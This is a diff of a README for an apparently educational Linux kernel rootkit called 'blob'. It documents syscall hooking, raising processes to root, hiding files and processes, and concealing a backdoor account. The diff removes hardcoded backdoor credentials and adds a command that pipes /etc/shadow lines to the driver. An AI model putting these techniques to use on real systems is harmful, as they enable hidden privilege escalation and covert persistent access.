@@ -34,51 +34,51 @@ This module is composed of two components, the core and the driver. Each compone
 The core program is the Linux kernel module that will handle system call hooking and other operations in the kernel space. All of these commands should be ran in the *core* directory. 
 >**You must have root privileges to run these installation commands**.
 
-    cd core
+    # cd core
 
 #### Build
 
 To compile the module, run `make`
 
-    make
+    # make
 
 #### Install
 
 To install the module, run `insmod`
 
-    insmod src/blob.ko  
+    # insmod src/blob.ko  
 
 #### Build & Install
  This one-liner will build & install the module for us, provided by our Makefile.
 
-    make install
+    # make install
 
 > **Note**: Our module loads with the name `blob` when displayed from `lsmod`.
 > 
 #### Uninstall 
 To uninstall the module, run `rmmod`
 
-    rmmod blob
+    # rmmod blob
 
 #### Clean
 In the event that you need to re-compile our module, you can clean the compiled object and kernel-object files with this command.
 
-    make clean
+    # make clean
 
 ### Driver
 The driver program is used to communicate to the core program from user space. This will interface the client and the core by accepting a series of command arguements. All of these commands should be ran in the *driver* directory. 
 
-    cd driver
+    $ cd driver
 
 #### Install
 Install the driver program using the C compiler.
 
-    cc syscall.c -o syscall
+    $ cc syscall.c -o syscall
 
 #### Uninstall
 To uninstall the driver program, delete it.
 
-    rm syscall
+    $ rm syscall
 
 ## Usage
 
@@ -96,12 +96,12 @@ Use the `driver` script to send remote commands to the module.
 
 |Command| Description |
 |--|--|
-| `drop PID ` | set a process's EUID to its UID |
-| `elevate PID ` | set a process's EUID to root |
-| `fugitive ETC_PASSWD_LINE ETC_SHADOW_LINE ` | lines in "/etc/passwd" and "/etc/shadow" |
-| `hide PATH_OR_COMMAND_LINES ` | hide an entity (a directory entry or ALL processes matching the command line: in that order) |
-| `show PATH_OR_COMMAND_LINES ` | show a hidden entity (a directory entry or ALL processes matching the command line: in that order) |
-| `unfugitive ETC_PASSWD_LINE ETC_SHADOW_LINE ` | show lines in "/etc/passwd" and "/etc/shadow" |
+| `drop PID` | set a process's EUID to its UID |
+| `elevate PID` | set a process's EUID to root |
+| `fugitive ETC_PASSWD_LINE ETC_SHADOW_LINE` | lines in "/etc/passwd" and "/etc/shadow" |
+| `hide PATH_OR_COMMAND_LINES` | hide an entity (a directory entry or ALL processes matching the command line: in that order) |
+| `show PATH_OR_COMMAND_LINES` | show a hidden entity (a directory entry or ALL processes matching the command line: in that order) |
+| `unfugitive` | show lines in "/etc/passwd" and "/etc/shadow" |
 
 ## File Hiding
 Commands such as ps or tree make use of the getdents(GETDirectoryENTrieS) syscall to get a list of directory entries at the given directory.
@@ -251,20 +251,26 @@ And back it up in case the user wants to drop the privileges.
 ### Example
 Escalating a process with a PID 12345
 
-    ./driver elevate 12345
+    $ ./driver elevate 12345
 Dropping the escalated process back to its original UID
 
-    ./driver drop 12345
+    $ ./driver drop 12345
 
 >**Note:** You may only drop processes you have escalated before.
 
 ## Backdoor Account
-When the rootkit is first loaded, it adds backdoor account into /etc/passwd and /etc/shadow if the account doesn't exist already. It also hides backdoor account while the rootkit is loaded by hijacking write syscall and change the output buffer.
+**PLEASE NOTE: at most, 1 account can be hidden at a time**
+The rootkit hides a backdoor account by hijacking the read syscall and truncating parts of the output buffer.
 
-### Backdoor account info
-> Username = fugitive
+### Hiding an Account
+Pass 1 line from "/etc/passwd" along with another from "/etc/shadow" into the driver:
 
-> Password = Password123
+    $ ./driver fugitive `cat /etc/passwd | grep MY_USERNAME` `sudo cat /etc/shadow | grep MY_USERNAME`
+
+Makign those lines visible again is as simple as:
+
+    $ ./driver unfugitive
+
 
 ## Using the System Call Table Modifier (`sctm`)
 `sctm` is partially object-oriented (in that all operations occur on a `struct sctm *`);
